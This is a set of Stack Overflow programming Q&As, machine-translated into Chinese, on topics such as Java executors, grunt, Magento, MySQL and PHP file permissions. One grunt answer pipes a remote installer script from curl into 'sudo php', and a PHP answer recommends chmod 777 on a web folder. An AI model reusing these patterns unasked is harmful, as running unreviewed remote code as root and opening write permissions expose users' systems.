## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:40:33.487

不，您无法接收多种消息类型。它要么是全部，要么只是一种类型，或者是除了单一类型之外的全部。

你*可以*做的是`msgrcv`用`IPC_NOWAIT`标志调用两次，每种类型一次。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T11:54:08.647

> 客户端和服务器通过同一个队列相互通信。

我建议客户端和服务器有单独的单独队列。然后服务器可以接收到它的队列中的所有消息（使用 msgtype 为 0）。它可以根据收到的消息的 msgtype 进行切换并执行必要的操作。

# grid - Kendo UI 网格过滤器自动对焦

> ID：14977724
> 
> 赞同：0
> 
> 时间：2013-02-20T10:36:14.170
> 
> 标签：grid, kendo-ui, autofocus

使用剑道网格时，打开过滤器选项将使第一个操作员焦点。我知道这在有多个运算符时很有用，但我只允许包含运算符，因此希望第一个值框具有焦点。

我该怎么办？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-11-16T09:40:35.157

If you want to limit the filter options:

*   Add extra: false
*   Define only the operators you want

Code example:

```
$('#grid').kendoGrid({
    dataSource: dataSource,
    height: '240px',
    columns: [
        { field: 'Id' },
        { field: 'Number', title: 'Employee #' },
        { field: 'First', title: 'FirstName' },
        { field: 'LastName', title: 'LastName' },
        {
            field: 'FunctionCode', title: 'Function', filterable: {
                extra: false,
                operators: {
                    string: {
                        eq: "Is equal to",
                        neq: "Is not equal to"
                    }
                }
            }
        }
    ]
}); 
```

See Kendo UI Grid running demo [here](http://demos.kendoui.com/web/grid/filter-menu-customization.html).
And see [this](http://kendogridbinderex.apphb.com/Employee) page for an example.

# java - 执行器是否意味着被重用？

> ID：14977730
> 
> 赞同：22
> 
> 时间：2013-02-20T10:36:33.720
> 
> 标签：java, concurrency, executorservice, java.util.concurrent

executor 对象是否意味着在`shutdown`? 我的意思是，如果我调用`shutdown`或`shutdownNow`在执行程序终止之后，我应该`new`创建一个新的线程池还是有可能以某种方式“重置”/重用先前终止的执行程序并重用它？

**更新：**
如果我需要创建新的线程池，我如何“理解”之前的已经停止？
例如以下：

```
public void startPool(){  
   if(threadPool != null && !threadPool.isShutdown()){
    return;
   }  
   threadPool = Executors.newCachedThreadPool();  
   //other stuff

}  

public void stopPool(){  
   if(threadPool != null){  
    threadPool.shutdown();   
  }  
} 
```

不管用。如果我调用`stop`然后`start`由于条件原因将不会创建新的线程池。对此进行编码的正确方法是什么？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-02-20T10:38:20.190

从[文档](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/ExecutorService.html)：

> 终止时，执行者没有正在执行的任务，没有等待执行的任务，也没有新的任务可以提交

所以（简要地），不，你不能重复使用它。从[shutdown() 文档](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/ExecutorService.html#shutdown%28%29)：

> 启动有序关闭，其中执行先前提交的任务，但不会接受新任务。

方法`isTerminated()`和`isShutdown()`可用于确定执行器是否已关闭，以及任务是否已分别完成。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-02-20T10:46:33.730

1) ThreadPoolExecutor 关闭后不能重用，API

```
An ExecutorService can be shut down, which will cause it to reject new tasks 
```

注意：如果要重用它，请不要关闭 ThreadPoolExecutor。

2）如果您想知道是否需要重新创建 ThreadPoolEdxecutor 使用

```
ExecutorService.isShutdown() 
```

如果此执行程序已关闭，则返回 true

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2013-02-20T10:51:05.993

我们在这里谈论的是 Oracla Javas ThreadPoolExecutor（实现 Executor 接口）。在那里，关于 shutdown 的方法注释并没有明确禁止将*Shutdown*转换回*Running*，但类注释列出了 ThreadPoolExecutors 支持的所有转换，并且无法从*Shutdown*返回。返回将需要另一种方法*重新启动/启动*或类似的。这不存在，但发现它有用的人可以扩展接口并实现关机后重新启动，而不会破坏关机语义。这样做可能会有点困难，因为关闭本身并不能保证处理最终会停止。所以工人们可能会继续工作，直到他们完成，如果他们完成的话。与创建另一个执行程序相比，在这种情况下重新启动可能不值得额外的工作。

# python - pdb.set_trace() 用于 powershell 跳转到调试器交互式控制台

> ID：14977731
> 
> 赞同：1
> 
> 时间：2013-02-20T10:36:34.237
> 
> 标签：python, powershell

python pdb.set_trace()的powershell中是否有等价物？

我希望能够在特定行停止执行脚本，然后跳转到调试器交互式控制台。（我宁愿不必使用 ISE）

我已经看到有一个 Set-PSBreakpoint，但需要指定脚本和行。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-10T14:44:16.590

我最喜欢的是

```
$Host.EnterNestedPrompt() 
```

就一行。您的脚本将停在那里，您将获得一个外壳，您可以在其中检查变量等。完成后，您只需退出嵌套外壳并继续执行。不过，我以前有时会把这些陈述留在身边，所以现在我总是：

```
######## DEBUG ##########
$Host.EnterNestedPrompt()
######## END DEBUG ########## 
```

所以当我完成它们时，我可以很容易地找到（并删除）它们。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T11:24:21.480

好的，所以 python 的 pdb.set_trace() 在 powershell 中的等价物是：

```
function Set-Trace {
  Set-PSBreakPoint -Line ($MyInvocation.ScriptLineNumber + 1) -Script $MyInvocation.ScriptName
} 
```

但是，与 python 不同，在 powershell 中，一旦您安装了跟踪，它将永远存在，直到您终止您的 powershell 会话。我建议将此添加到脚本的开头以删除旧痕迹：

```
function Remove-AllTraces {
  Get-PSBreakpoint | Remove-PSBreakpoint
} 
```

非常感谢@Richard 的建议。:)

# javascript - javascript推送函数中的动态变量

> ID：14977733
> 
> 赞同：0
> 
> 时间：2013-02-20T10:36:38.907
> 
> 标签：javascript, variables

我在javascript中使用推送功能。

```
var chartData = [];
for(var i=0; i<3; i++) {

    chartData.push({

        date: new Date(year_s,mon_s,date_s,hr_s,min_s,sec_s),
        visits: chartData1[selection[i]][j].value,
        customBullet: show_annotations,
        balloonTextField: "testtesttest"
    });

} 
```

我需要传递一个动态变量，如visits_1、visits_2 等。代替上面代码中的访问变量。我试过访问+“_”+i。但它不起作用。请帮助我实现这一目标。提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T10:38:50.897

您必须分两步完成：

```
var chartData = [];
for(var i=0; i<3; i++) {
   // 1\. create the object
   var d =  { 
      date: new Date(year_s,mon_s,date_s,hr_s,min_s,sec_s),
      customBullet: show_annotations,
      balloonTextField: "testtesttest"
   };
   // 2\. then assign the visits_i property
   d['visits_'+i] = chartData1[selection[i]][j].value; 
   chartData.push(d);
} 
```

# php - 在结帐/单页末尾添加自定义复选框

> ID：14977738
> 
> 赞同：2
> 
> 时间：2013-02-20T10:36:46.557
> 
> 标签：php, magento, e-commerce

在结帐/一页的末尾，我想在协议下方添加一个复选框。目前只有条款。

我喜欢添加一个可选复选框，用户可以在其中注册时事通讯或检查产品是否应按原样包装。当然，这个字段也应该显示在后端，这样我就可以看到订单是礼物还是用户想要时事通讯。

有人能告诉我如何做“礼物复选框”或时事通讯吗？

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T14:46:33.983

我之前通过执行以下操作涵盖了时事通讯选项：

**添加字段**

更新模板 checkout/onepage/agreements.phtml 以包含您的新复选框，

**使用 checkout_type_onepage_save_order_after**

使用自定义模块使用类似的东西

```
<events>
    <checkout_type_onepage_save_order_after>
        <observers>
            <your_module>
                <class>your_module/observer</class>
                <method>saveOrderAfter</method>
            </your_module>    
        </observers>
    </checkout_type_onepage_save_order_after>
</events> 
```

**在观察者中获取客户信息**

在你的观察者中，你可以通过

```
Mage::app()->getRequest()->getParam('whatever_you_called_your_field', false); 
```

然后您可以获取订单 customerid 或电子邮件

```
$observer->getData('order')->getCustomerId();
$observer->getData('order')->getCustomerId(); 
```

此时，您可以加载时事通讯/订阅者模型并订阅电子邮件或加载客户并将 setIsSubscribed 设置为 true。

这不会根据订单保存属性，但如果您在安装脚本中创建订单属性，那么您可以使用观察者针对您的订单设置此属性，尽管使用 sales_order_save_before 事件针对订单设置属性可能更安全.

```
$installer->addAttribute(
    'order',
    'your_attribute',
        array(
            'label' => 'Newsletter',
            'type'  => 'int'
        )
); 
```

# ios - 编译 OpenCV 时找不到

> ID：14977741
> 
> 赞同：0
> 
> 时间：2013-02-20T10:36:51.613
> 
> 标签：ios, xcode, opencv, cmake

我正在尝试按照这些[说明](http://docs.opencv.org/trunk/doc/tutorials/introduction/ios_install/ios_install.html)为 iOS 编译 OpenCV 。

我已经安装了最新的 iOS SDK 和 CMake 版本 2.8.10.2。

我需要符号链接，但出现此错误：

```
In file included from /Users/xxx/SourceCode/OpenCV/opencv/modules/softcascade/src/integral_channel_builder.cpp:43:
In file included from /Users/xxx/SourceCode/OpenCV/opencv/modules/softcascade/src/precomp.hpp:56:
/Users/xxx/SourceCode/OpenCV/opencv/modules/softcascade/src/_random.hpp:75:12: fatal error: 'tr1/random' file not found
#  include <tr1/random>
           ^ 
```

我检查了文件是否在我的笔记本电脑中，`find /Developer/ -name random`这就是我得到的：

```
XXXX-MacBook-Pro:/ xxx$ find /Developer/ -name random
/Developer//Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS6.1.sdk/usr/include/c++/4.2.1/tr1/random
/Developer//Platforms/iPhoneSimulator.platform/Developer/SDKs/iPhoneSimulator6.1.sdk/usr/include/c++/4.2.1/tr1/random
/Developer//Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.7.sdk/System/Library/Frameworks/Python.framework/Versions/2.5/Extras/lib/python/numpy/random
/Developer//Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.7.sdk/System/Library/Frameworks/Python.framework/Versions/2.6/Extras/lib/python/numpy/random
/Developer//Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.7.sdk/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/numpy/random
/Developer//Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.7.sdk/usr/include/c++/4.2.1/tr1/random
/Developer//Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.8.sdk/System/Library/Frameworks/Python.framework/Versions/2.5/Extras/lib/python/numpy/random
/Developer//Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.8.sdk/System/Library/Frameworks/Python.framework/Versions/2.6/Extras/lib/python/numpy/random
/Developer//Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.8.sdk/System/Library/Frameworks/Python.framework/Versions/2.7/Extras/lib/python/numpy/random
/Developer//Platforms/MacOSX.platform/Developer/SDKs/MacOSX10.8.sdk/usr/include/c++/4.2.1/tr1/random
/Developer//Toolchains/XcodeDefault.xctoolchain/usr/lib/c++/v1/random 
```

**我究竟做错了什么？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-23T04:42:34.677

我也有这个编译错误。我更改文件“ios/cmake/Modules/Platform/iOS.cmake”第 43 行

设置（CMAKE_CXX_FLAGS “-stdlib=libc++ -headerpad_max_install_names -fvisibility=hidden -fvisibility-inlines-hidden”）

至

设置（CMAKE_CXX_FLAGS “-stdlib=libstdc++ -headerpad_max_install_names -fvisibility=hidden -fvisibility-inlines-hidden”）

并成功构建opencv.framework ...希望这会有所帮助..

# mysql - 将 SQL 表头值与另一个表列值匹配

> ID：14977754
> 
> 赞同：1
> 
> 时间：2013-02-20T10:37:32.110
> 
> 标签：mysql, sql

有 2 个数据库表，如下表 Table_1 和 Table_2。Table_1 列索引与 table_2 的 id 值匹配。Table_2 的名称值将作为查询结果的列标题。

```
Table_1
______________________________________________
| date      |city_1 | city_2 | ... | city_100 |
|-----------|-------|-------------------------|
| 20.02.2013|   4   |   34   | ... |   222    |
| 21.02.2013|   3   |   10   | ... |    33    |
|    ...    |  ...  |   ...  | ... |   ...    |
|_____________________________________________|

  Table_2
___________________
|  id   |   name  |
|-------|---------|
|   1   | newyork |
|   2   | london  |
|  ...  |   ...   |
|  100  | istanbul|
|_________________| 
```

预期结果如下

```
 __________________________________________________________
  |  date     |  newyork   |   london   |  ...  |  istanbul |
  |-----------|------------|------------|-------|-----------|
  | 20.02.2013|     4      |     34     |  ...  |    222    |
  | 21.02.2013|     3      |     10     |  ...  |     33    |
  |   ...     |    ...     |    ...     |  ...  |    ...    |
  |___________|____________|____________|_______|___________| 
```

获取上述结果的 SQL 查询是什么？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T11:12:03.903

您可以使用这样的解决方案：

```
SET @sql = NULL;

SELECT GROUP_CONCAT(COALESCE(CONCAT(COLUMN_NAME, ' as ', Table_2.Name), COLUMN_NAME))
FROM
  INFORMATION_SCHEMA.COLUMNS
  LEFT JOIN Table_2
  ON Table_2.ID = SUBSTRING_INDEX(COLUMN_NAME, '_', -1)
WHERE table_name = 'Table_1' INTO @sql;

SET @sql = CONCAT('SELECT ', @sql, ' FROM Table_1');

PREPARE stmt FROM @sql;
EXECUTE stmt;
DEALLOCATE PREPARE stmt; 
```

[在这里](http://sqlfiddle.com/#!2/ce2b7/1)看到它。此代码将提取 Table_1 的所有列名，并尝试将列名与 Table_2 中的 ID 连接起来。如果匹配，我将返回带有别名的列的名称，如下所示：

```
city_1 AS newyour 
```

并使用 GROUP_CONCAT 变量 @sql 将包含所有列，如下所示：

```
date,city_1 as newyork,city_2 as london,city_100 as istanbul 
```

然后我将`'SELECT '`+ 列名与别名 +连接起来`' FROM Table_1'`，并执行生成的查询。

# c - 内存分配查找

> ID：14977755
> 
> 赞同：0
> 
> 时间：2013-02-20T10:37:32.200
> 
> 标签：c, memory, memory-management

我分配了内存：

```
int *p = (int *) malloc(sizeof(int)); 
```

然后我输入它：

```
char *new = (char *)p; 
```

我取消分配它：

```
free(new); 
```

1) 当字符有 1 个字节的空间时，将释放多少内存？2）内存管理器（在嵌入式系统中）应该建立什么样的内部机制来跟踪分配的内存和释放的内存？（不允许布尔值）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:11:07.710

当您调用`malloc`（或其中一个兄弟姐妹）时，分配的内存大小将其存储为“有关此分配的信息”（`info_block`）的一部分。`malloc`不知道您是否传入`sizeof(int)`，常量`4`​​或`sizeof(short)*2`其他任何您可能给它的东西[实际上，它很可能将分配扩展到 16 个字节-并且此大小存储为分配的一部分。

当您稍后调用 时`free`，它会“找回” `info_block`，然后它知道要释放的大小。因此，您对指针进行的强制转换或其他操作都没有关系 - 只要里面的指针是相同的值。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:45:53.993

在您的具体情况下，答案取决于底层架构。假设一台 32 位机器，指针的大小总是 4 个字节。如果你使用它可能会很麻烦，即

```
int *p = (int *) malloc(sizeof(char)); 
```

但我相信你会收到警告。

因此，在您的情况下，分配的是 4 个字节。

此外，您不应从 malloc 中转换 void*：

```
int *p = malloc(sizeof(int)); 
```

很好。

# analytics - 跟踪用户从网站到 iOS 应用安装

> ID：14977758
> 
> 赞同：2
> 
> 时间：2013-02-20T10:37:37.113
> 
> 标签：analytics

我有附属网站链接到我的 ios 应用程序。我想跟踪这一点，并能够知道每个用户是从哪里引荐的。

做这个的最好方式是什么？我正在考虑以下几点：

1.  在每个附属网站上包含一个 javascript，显示智能应用横幅并在通过 iPhone 查看时记录访问者 IP
2.  安装应用时，将用户的 IP 与通过 javascript 记录的 IP 进行比较。假设在 15 分钟的时间范围内相同的 IP 是相同的用户。

这并不完美（因为多个用户可能具有相同的 IP 地址）。有没有更好的方法？

# d3.js - 使用带有 dc.js 和 d3.js 的交叉过滤器 - 如何将 csv 年份数据转换为日期格式？

> ID：14977764
> 
> 赞同：0
> 
> 时间：2013-02-20T10:37:56.293
> 
> 标签：d3.js, crossfilter, dc.js

我正在尝试使用带有标题为“年份”的列的 csv 数据源来生成使用 dc.js 的条形图来创建基于交叉过滤器的仪表板。我看不出如何将年份转换为可用的日期格式。有没有人可以帮忙？

我正在使用 dc.js 1.2 和 d3.v3.min.js

我尝试调整主要示例，但不知道“e”来自：

```
var dateFormat = d3.time.format("%Y");
var numberFormat = d3.format(".2f");

         data.forEach(function(e) {
            e.dd = dateFormat.parse(e.Year);
         }); 
```

我也试过这个：

```
var dateYear = new Date(d.Year, 0);// The required 0, is for January 
```

变量声明为：

```
var yearDimension = data.dimension(function(d){ return d3.time.year(d.dd);}); 
```

而且我还尝试了完全放弃日期格式并使用序数比例：

```
.x(d3.scale.ordinal())
//.xUnits(d3.units.ordinal); 
```

将变量声明为：

```
var yearDimension = data.dimension(function(d){ return d["Year"];}); 
```

并且

```
var yearDimension = data.dimension(function(d){ return (String(d["Year"]));}); 
```

但是这个设置产生了这个错误：

```
Uncaught TypeError: Cannot read property 'ordinal' of undefined 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-03T21:09:27.947

这是声明 csv 文件时的错误。

问题在这里解决：[https ://github.com/NickQiZhu/dc.js/issues/127](https://github.com/NickQiZhu/dc.js/issues/127)

# image - 图像在某些页面上不起作用但在其他页面上很好？

> ID：14977765
> 
> 赞同：0
> 
> 时间：2013-02-20T10:37:57.560
> 
> 标签：image, web, path, hyperlink

我为本地企业设计了一个网站，但由于某种原因，图像在上传到 FTP 服务器时无法正常工作。当我在本地查看它们时它们工作正常，并且对于不起作用的图像和那些起作用的图像的路径完全相同？

该网站是：www.Neontattooart.com - 这个图像就是它的样子。

[http://i47.tinypic.com/155hzte.png](http://i47.tinypic.com/155hzte.png)

如果需要，可以发布任何额外的代码，但大部分都在那里。

提前致谢。斯科特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:42:26.297

FTP 上您网站的根目录中是否有文件夹名称“images”？

该图像应该在[http://www.neontattooart.com/images/thumbnail.png](http://www.neontattooart.com/images/thumbnail.png)上可用，但它不是。

# android - 移动应用安装量和每日活跃用户 (DAU) 之间的差异

> ID：14977768
> 
> 赞同：0
> 
> 时间：2013-02-20T10:38:05.813
> 
> 标签：android, ios, facebook, facebook-insights

我有一个使用 Facebook 登录和发布功能的游戏。但我的疑问是，当我看到 Insight 部分时，我发现移动应用安装量在 1500 左右，但每日活跃用户 (DAU) 仅为 883 左右。据我了解，DAU 必须高于应用安装量。

谁能澄清这些。我还需要验证我在 SDK 实现中没有实现任何错误。我在 iOS 和 Android 上都有游戏，都使用 Facebook。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:41:02.230

如果我理解正确的话。

应用安装次数 = 曾经安装过您的应用的总人数。

DAU = 每天使用您的应用的人数。

DAU 将始终小于应用安装量。使用该应用程序的人数不能超过安装该应用程序的人数。

注意它不是每日活跃使用。是用户。它计算的是使用该应用程序的人数，而不是该应用程序的使用次数。一位用户可能会使用该应用程序 100 次，但您仍然只能获得 1 的 DAU。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T09:36:16.653

**TL;博士**

DAU 是平均每天使用您的应用或从您的应用中消费内容的人数。

移动应用安装次数是您的应用被“安装”的次数。每个应用程序安装都是唯一的。通过尝试打开会话来报告移动应用安装。

**解释**

DAU 是平均每天使用您的应用的人数。

facebook 如何将用户定义为“活跃”是：

> 用户在查看或参与您的应用或应用的内容时处于活跃状态。Insights Dashboard 上显示的主要来源表明每个活动来源有多少用户被认为是活跃的。应用的活动源包括：
> 
> 访问您应用的画布页面的用户
> 
> 在主页上查看您的应用选项卡的用户
> 
> 通过您的应用发布到动态消息（流）的用户
> 
> 从您的应用中“点赞”流媒体故事的用户
> 
> 对您应用中的直播故事发表评论的用户

取自[https://www.facebook.com/help/399262596797358/](https://www.facebook.com/help/399262596797358/)

此外，每当您尝试打开一个

```
FBSession 
```

目的。他们在sdk里面的代码如下：

```
- (id)initWithAppID:(NSString*)appID
        permissions:(NSArray*)permissions
    defaultAudience:(FBSessionDefaultAudience)defaultAudience
    urlSchemeSuffix:(NSString*)urlSchemeSuffix
 tokenCacheStrategy:(FBSessionTokenCachingStrategy*)tokenCachingStrategy {

.
.
.
[FBSettings autoPublishInstall:self.appID];
} 
```

如果您按照教程进行操作，则会从打开的会话方法中调用，例如

```
+openActiveSessionWithAllowLoginUI
+openActiveSessionWithReadPermissions:allowLoginUI:completionHandler: 
```

因此，即使用户没有登录您的应用程序，也会报告安装（因为您需要调用

```
openActiveSessionWithAllowLoginUI:NO 
```

能够实现单点登录。

# c++ - 如何使用私有构造函数 C++ 测试私有成员

> ID：14977770
> 
> 赞同：2
> 
> 时间：2013-02-20T10:38:09.087
> 
> 标签：c++, unit-testing, googletest

我在下面有一些代码：

```
class base{
private:
    base();
    int x;
public:
    friend class child;
};
class child{
public:
    void display(base* b)
    {
        b->x = 1;
    }

};
int main()
{
    base* t;
    //t = new base;
    child c;
    c.display(t);
} 
```

我无法分配对象`t`。我想测试`x`. 如何测试此代码？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T10:41:35.897

你通常只测试你的类的公共 API。
因此，如果您有必要测试 的值，则该值`x`很可能也与其他类相关。您声明`child`为可以访问的朋友`x`这一事实支持了这一事实。

结论：
公开`x`或（更好地）提供 getter 和可能的 setter 方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:47:05.220

将此代码添加到公共部分的基类中：

```
friend int main(); 
```

然后在 main 函数中，取消注释以下行：

```
t=new base; 
```

但我建议您将基类的构造函数设为公共而不是私有。另外，我真的很好奇您为什么将基类的构造函数设为私有。

# gruntjs - 未找到 grunt 警告任务“watch”

> ID：14977771
> 
> 赞同：21
> 
> 时间：2013-02-20T10:38:10.317
> 
> 标签：gruntjs

Gruntfile.js：

```
grunt.initConfig({
 watch: {
  compass: {
    files: [
      'app/styles/**/*.{scss,sass}'
    ],
    tasks: 'compass reload'
  },
.....
grunt.registerTask('dev', 'watch'); 
```

当我跑步时

```
grunt dev 
```

我得到了错误

```
Warning: Task "watch" not found. Use --force to continue. 
```

我使用 grunt-cli v0.1.6 和 grunt v0.4.0，安装了 grunt-contrib-watch。

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2013-04-04T15:41:57.663

您不必安装整个 contrib-package。有一个单独的手表

```
npm install grunt-contrib-watch --save-dev 
```

最后：

```
grunt.loadNpmTasks('grunt-contrib-watch'); 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-02-20T11:13:10.577

出色地。

```
npm install grunt-contrib --save-dev 
```

并在 grunt.js 的最后一行之前添加这一行：

```
grunt.loadNpmTasks('grunt-contrib'); 
```

另外，我必须安装 Ruby...

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-12-09T14:15:03.250

实际上，如果没有安装插件，你不会有错误 launcinh `grunt watch`，只是一个无法加载`watch`任务的错误。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-06-21T16:57:01.583

当我在终端上运行 grunt watch 时，遇到错误并修复：

**错误**

```
grunt watch
Loading "Gruntfile.js" tasks...ERROR 
```

**终端中的 FIX**

```
 brew install npm
 brew install node 
```

*   然后你测试节点和 npm 工作

    ```
    node -v
    npm -v 
    ```

*   安装咕噜

    ```
    npm install -g grunt-cli
    npm install grunt-contrib-watch --save-dev 
    ```

*   安装作曲家

    ```
    curl -sS https://getcomposer.org/installer | sudo php -- --install-dir=/usr/local/bin --filename=composer 
    ```

*   然后跑

    ```
    grunt watch 
    ```

有效！

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-09-29T14:13:16.413

我知道这个问题很老了，但是自从 Serge 说之后还没有得到正确的回答

> 安装了 grunt-contrib-watch。

我会检查整个 Gruntfile 是否被

```
module.exports = function (grunt) {

}; 
```

当您过早关闭此功能（意外）时，您会收到描述的错误。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-03-22T08:03:09.377

浏览器更新和 npm 更新对我有用。

# php - 在php中创建一个文件

> ID：14977772
> 
> 赞同：-1
> 
> 时间：2013-02-20T10:38:11.287
> 
> 标签：php, file-permissions

我创建了一个 php 文件。我为下面提到的代码编写的代码

```
$my_file = 'my_options.sql';
$handle = fopen($my_file, 'w') or die('Cannot open file:  '.$my_file); 
```

之后我在我的文件夹下找不到文件。有一个权限错误，例如

```
Warning: fopen(my_options.sql) [function.fopen]: failed to open stream: Permission denied in /var/www/TantraProjects/Ranjit/nt_plugin/wp-content/plugins/option-url-changes/option-url-change.php on line 17 
```

我怎样才能纠正错误并在forlder下创建一个文件。我不想手动授予文件权限。有什么方法可以授予创建文件的权限。请帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:41:25.197

您需要通过 FTP / SSH / 其他方式将文件夹 CHMOD 到 755 或 777（如果 755 不起作用 - 最好尽可能严格）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:43:06.103

您应该授予文件夹“777”的权限，因为您正在尝试写入。

# c# - 在控制器中反序列化 JSON 模型时遇到问题

> ID：14977775
> 
> 赞同：0
> 
> 时间：2013-02-20T10:38:30.980
> 
> 标签：c#, javascript, json

我有以下 C# 模型，但它们没有从 JSON 中获取 Id 或 AssigneeId 有什么帮助吗？：

```
public class AssignModel
{
    [Required]
    public Guid Id { get; set; }
    public bool Clear { get; set; }
    public string AssigneeId { get; set; }
}

public class MassAssignModel
{
    [Required]
    public List<AssignModel> Tickets { get; set; }
} 

public ActionResult MassAssign(MassAssignModel model)
{
    //DO stuff here
} 
```

我试图通过反序列化 JSON 来填充这些，但它永远不会得到值。这是我的 javascript，第一个方法调用是 massAssign()：

```
function massAssign() {
    assignTicketsTo(getSelectedTicketsIds());
}

function getSelectedTicketsIds() {
    var tickets;
    var selected = $('.selected-ticket:checked');
    tickets = selected.map(function () {
    return { Id: this.value, AssigneeId: "COMPONENTS\ASTANNARD", Clear:false };
    }).get();

    return tickets;
}

function assignTicketsTo(selectedTicketsIds) {

    var postdata = JSON.stringify({
        Tickets: [selectedTicketsIds]
    });

    $.ajax({
    url: Helper.Util.action({ controller: "Ticket", action: "MassAssign" }),
    dataType: 'json',
    data: postdata,
    type: 'post',
    success: function (data, textStatus, jqXHR) {

    },
    error: function (jqXHR, textStatus, errorThrown) {
        $("#load_tickets").hide();
        Helper.alert(errorThrown);
    }
}); 
```

}

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:41:46.217

如果您想将 JSON 发送到 MVC 控制器，您需要`contentType`在`'application/json'`您的`$.ajax`:

```
$.ajax({
    url: Helper.Util.action({ controller: "Ticket", action: "MassAssign" }),
    dataType: 'json',
    contentType: 'application/json',
    data: postdata,
    type: 'post',
    success: function (data, textStatus, jqXHR) {

    },
    error: function (jqXHR, textStatus, errorThrown) {
        $("#load_tickets").hide();
        Helper.alert(errorThrown);
    } 
```

[数据](http://api.jquery.com/jQuery.ajax/)类型用于

> 您期望从服务器返回的数据类型。

您的代码还有一个问题，当您创建变量时，`postdata`该`selectedTicketsIds`变量已经包含一个数组，因此您无需再次使用`[selectedTicketsIds]`.

因此，将您的更改`postdata`为：

```
var postdata = JSON.stringify({
        Tickets: selectedTicketsIds
}); 
```

# ms-access - 根据列表框选择更新子表单

> ID：14977779
> 
> 赞同：2
> 
> 时间：2013-02-20T10:38:49.893
> 
> 标签：ms-access, ms-access-2000

首先，我想说我已经阅读了与此类似的其他问题，但它们并没有解决问题。

我有一个包含子表单的表单。主表单只是有一个列表框，它显示表中的所有条目（尽管只显示其中的三个字段），而子表单旨在显示与列表框中选择的记录相关联的所有数据。

我已将链接主字段和链接子字段设置为 ClientID（该表用于客户信息）。当我第一次打开主表单时，子表单会显示列表框中第一项的数据，但是当我在列表框中选择不同的项目时，子表单不会更新。我曾尝试使用 Requery VBA 方法，但没有多大成功。

有没有人有任何提示？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-20T10:56:09.367

将链接主字段设置为列表框的名称。确保列表框返回客户端 ID。

例如

```
 Row Source : SELECT ClientID, ClientName FROM Table
 Bound Column : 1
 Column Count : 2

 Link Master Fields : MyListBox
 Link Child Fields  : ClientID 
```

现在，当用户从列表框中选择一个客户端时，子表单将更新为该客户端的数据。

# xml - XML 块的条件计数

> ID：14977782
> 
> 赞同：2
> 
> 时间：2013-02-20T10:38:54.580
> 
> 标签：xml, xslt, counter

我有一个格式如下的 XML 文件：

```
<block>
 <name> blocky </name>
 <time1> 20 </time1>
 <time2> 17 </time2>
</block>
<block>
 <name> rocky </name>
 <time1> 3 </time1>
 <time2> 5 </time2>
</block>
... 
```

为此，我将块的“差异”定义为 time1 的值 div 的值 time2 的值。

我需要做的是计算 diff > 10% 的块数，并找到一个具有最大 diff 的块并打印它的名称。

如何使用 XSLT 做到这一点？我不能更新变量，所以我不能使用计数器，也不能使用最大值。

谢谢你的帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-20T11:12:20.100

我假设所有块都是 <blocks> 元素的子元素。

您的问题的解决方案是：

```
<xsl:template match="blocks">
    <!-- Count number of blocks with diff greater than a number, in this case 10,
         because I do not know which is the maximum value (100%) that you can
         obtain with your specific data -->
    <xsl:value-of select="count(block[number(time1) div number(time2) >= 10])" />
    <!-- Find a block with maximum diff and print its name -->
    <xsl:for-each select="block">
        <xsl:sort select="number(time1) div number(time2)" data-type="number" order="descending" />
        <xsl:if test="position() = 1">
            <xsl:value-of select="name" />
        </xsl:if>
    </xsl:for-each>
</xsl:template> 
```

# php - Cakephp - 数组索引显示数字而不是模型名称

> ID：14977786
> 
> 赞同：1
> 
> 时间：2013-02-20T10:39:02.893
> 
> 标签：php, cakephp

我的蛋糕应用程序在我的家庭服务器上运行良好，在生产服务器上也运行良好。然而，自从主机提供商将 php 版本 5.3.13 更改为 5.3.21 后，事情就出现了歪斜。主要的失败是数组索引显示数字而不是模型名称（在本例中为文章）。
例如：

> array( (int) 0 => array( 'id' => '12', 'title_eng' => 'News Snippets Spain: 19 February',

代替

> 数组（'文章' => 数组（'id' => '12'，'title_eng' => '西班牙新闻片段：2 月 19 日'，

